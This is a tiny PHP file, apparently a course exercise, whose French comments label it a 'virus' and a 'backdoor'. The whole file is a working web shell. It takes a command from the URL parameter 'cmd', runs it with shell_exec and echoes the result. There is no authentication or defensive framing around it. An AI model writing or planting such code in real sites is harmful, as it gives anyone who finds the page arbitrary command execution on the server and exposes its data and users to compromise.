<?php 
// 01-virus.php
// backdoor 
// pouvoir écrire une commande
$cmd = $_GET["cmd"]; 
// exécuter la commande
$resultat = shell_exec($cmd) ; 
// afficher le retour visuel de la commande 
echo "<pre>";
var_dump($resultat);